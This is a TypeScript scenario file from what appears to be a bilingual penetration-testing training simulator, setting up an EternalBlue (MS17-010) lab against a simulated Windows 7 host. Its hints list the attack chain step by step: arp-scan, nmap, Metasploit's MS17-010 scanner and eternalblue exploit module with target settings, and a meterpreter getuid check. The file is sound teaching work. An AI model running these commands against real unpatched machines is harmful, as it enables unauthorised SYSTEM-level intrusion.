// ── laboratorios/laboratorio03.ts ───────────────────────────────────────
// Scenario 3 — EternalBlue / MS17-010 Windows 7
// Datos y configuración específicos para este escenario

import { buildScenario, COMMON_PORTS, createFile, createWebDirs } from './templates';
import type { Scenario } from '../types';

// Re-exportar resetAttackerCounter desde templates para compatibilidad
export { resetAttackerCounter } from './templates';

// Template específico para EternalBlue
export const SCENARIO_TEMPLATES_ETERNAL = {
  eternalBlue: () => ({
    id: 'scenario-03',
    name: 'EternalBlue — MS17-010',
    // Metadata for LandingPage cards
    tagline: 'Exploit MS17-010 with Metasploit. Get SYSTEM on an unpatched Windows 7.',
    taglineEs: 'Explota MS17-010 con Metasploit. Obtén SYSTEM en un Windows 7 sin parchear.',
    tools: ['arp-scan', 'nmap', 'msfconsole'],
    accentColor: '#f87171',
    description: 'EternalBlue exploitation on unpatched Windows 7 using Metasploit.',
    descriptionEs: 'Explotación EternalBlue en Windows 7 sin parchear mediante Metasploit.',
    difficulty: 'Easy' as const,
    category: 'Network' as const,
    networkRange: '172.16.0.0/24',
    targetMachine: {
      id: 'win7-target',
      machine_info: {
        hostname: 'WIN7-TARGET',
        mac: '08:00:27:C4:D5:E6',
        os: 'Windows 7 Professional SP1 x64',
        status: 'up' as const,
        type: 'workstation',
      },
      discovery_level: 0,
      scan_results: { ports: [] },
      learning_steps: [],
      ports: [
        COMMON_PORTS.smb('Windows 7 Professional 7601 Service Pack 1'),
        { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
        { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
        { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
      ],
      web_enumeration: {
        web_server: 'none',
        cms: 'none',
        directories: [],
      },
      files: [
        createFile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', 'ZIL{ETERNALBLUE_SYSTEM_PWNED}'),
        createFile('C:\\\\Windows\\\\System32\\\\config\\\\SAM', '[SAM Database — use hashdump]', 'binary'),
      ],
    },
    learningSteps: [
      { task: 'Network Reconnaissance', taskEs: 'Reconocimiento de red', text: 'Discover hosts on the network', textEs: 'Descubrí los hosts en la red', discoveryLevel: 1, hints: { hint1: { en: 'Use arp-scan', es: 'Usá arp-scan' }, hint2: { en: 'arp-scan 172.16.0.0/24', es: 'arp-scan 172.16.0.0/24' } }, validationCriteria: { type: 'discoveredHosts' as const, minHosts: 1 } },
      { task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify the services running on the target', textEs: 'Identificá los servicios que corren en el objetivo', discoveryLevel: 2, hints: { hint1: { en: 'Use nmap', es: 'Usá nmap' }, hint2: { en: 'nmap -sV 172.16.0.11', es: 'nmap -sV 172.16.0.11' } }, validationCriteria: { type: 'scanResults' as const, port: 445 } },
      { task: 'Verify Vulnerability', taskEs: 'Verificar vulnerabilidad', text: 'Check if the target is vulnerable to MS17-010', textEs: 'Verificá si el objetivo es vulnerable a MS17-010', discoveryLevel: 2, hints: { hint1: { en: 'Use Metasploit modules', es: 'Usá módulos de Metasploit' }, hint2: { en: 'msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run', es: 'msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run' } }, validationCriteria: { type: 'vulnerabilityFound' as const, vulnId: 'MS17-010' } },
      { task: 'Exploit EternalBlue', taskEs: 'Explotar EternalBlue', text: 'Exploit the MS17-010 vulnerability to gain access', textEs: 'Explotá la vulnerabilidad MS17-010 para obtener acceso', discoveryLevel: 3, hints: { hint1: { en: 'Use the EternalBlue exploit', es: 'Usá el exploit EternalBlue' }, hint2: { en: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST 172.16.0.10 → exploit', es: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST 172.16.0.10 → exploit' } }, validationCriteria: { type: 'exploit' as const } },
      { task: 'Verify SYSTEM Access', taskEs: 'Verificar acceso SYSTEM', text: 'Verify that you have obtained SYSTEM privileges', textEs: 'Verificá que obtuviste privilegios SYSTEM', discoveryLevel: 4, hints: { hint1: { en: 'Check your user id in meterpreter', es: 'Verificá tu ID de usuario en meterpreter' }, hint2: { en: 'getuid', es: 'getuid' } }, validationCriteria: { type: 'uidChecked' as const, isSystem: true } },
    ],
  }),
};

export const scenario_03: Scenario = buildScenario(SCENARIO_TEMPLATES_ETERNAL.eternalBlue());
